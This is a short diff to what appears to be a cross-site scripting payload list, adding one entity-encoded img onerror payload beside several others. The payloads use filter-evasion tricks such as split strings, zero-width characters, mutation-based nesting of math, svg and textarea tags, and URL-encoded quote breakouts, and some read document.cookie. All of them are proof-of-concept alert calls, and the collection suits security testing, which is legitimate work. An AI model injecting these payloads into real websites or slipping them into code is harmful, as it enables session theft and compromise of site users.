@@ -4,6 +4,7 @@ javascript:window['al'+'er'+(['t','b','c'][0])](origin)
 orwa%27"><svg/onload=alert(document.cookie)>
 1'"><img/src/onerror​=.1|alert``>
 <img srcset=1 onerror=alert(1)>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
 <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(1)'>">
 ' oncontent\visibilityautostatechange='a=alert,(a?a:a)(origin)' x=\v+styl\u0065='content-visibility:auto
 1%27;--<img%20src=x%20onerror=javascript:alert(document.domain)>
